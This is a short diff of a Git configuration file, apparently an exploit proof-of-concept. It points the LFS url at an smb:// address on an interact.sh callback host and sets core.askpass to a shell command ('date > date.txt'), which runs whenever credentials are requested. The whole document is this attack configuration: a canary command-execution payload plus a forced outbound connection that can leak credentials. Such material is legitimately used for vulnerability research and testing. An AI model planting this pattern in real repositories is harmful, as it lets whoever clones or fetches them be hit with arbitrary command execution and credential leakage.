@@ -1,5 +1,5 @@
 [lfs]
-	url = ftp://caspzwq2vtc0000wpc9ggfc5x6cyyyyyb.interact.sh
+	url = smb://caspzwq2vtc0000wpc9ggfc5x6cyyyyyb.interact.sh
 	storage = ../lfstorage
 [core]
 	askpass = date > date.txt
